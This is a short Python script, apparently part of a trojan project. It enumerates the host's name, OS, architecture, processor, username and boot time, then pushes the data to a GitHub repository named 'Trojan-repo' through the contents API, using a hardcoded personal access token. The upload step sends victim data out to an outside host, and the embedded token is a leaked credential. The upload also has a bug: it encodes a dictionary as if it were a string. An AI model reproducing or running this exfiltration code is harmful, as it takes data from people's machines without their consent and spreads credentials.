import socket
import platform
import psutil
from datetime import datetime
import os 
import json
import requests

class SystemEnumeration:
    def __init__(self):
        pass

    def gather_info(self):
        """
        Collects basic system information such as OS details, users, and running processes.
        """
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "architecture": platform.architecture(),
            "processor": platform.processor(),
            "username": os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown",
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            # "running_processes": [p.info for p in psutil.process_iter(attrs=['pid', 'name'])]
        }
        return info

# Create an instance of the SystemEnumeration class
security_tool = SystemEnumeration()

# Gather system information
print("Gathering system information...")
system_info = security_tool.gather_info()

# Print the system information
print(json.dumps(system_info, indent=4))

# Write the system information to an output file
output_file = "system_info.txt"
with open(output_file, "w") as file:
    json.dump(system_info, file, indent=4)

print(f"System information has been saved to {output_file}.")


repository_owner = "BlertaJashanica"
repository_name = "Trojan-repo"
file_path = "data/"
file_content = system_info
github_token = "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"
commit_message = 'updated output'

api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
headers = {
    "Authorization": f"Token {github_token}",
    "Accept": "application/vnd.github.v3+json"
}

import base64
file_content_encoded = base64.b64encode(file_content.encode()).decode()

response = requests.get(api_url, headers=headers)
if response.status_code == 200:
    current_file = response.json()
    sha = current_file["sha"]
else:
    sha = None

payload = {
    "message": commit_message,
    "content": file_content_encoded,
    "sha": sha
}

response = requests.put(api_url, json=payload, headers=headers)
if response.status_code == 201:
    print("File pushed successfully!")
else:
    print("An error occurred while pushing the file:", response.text)



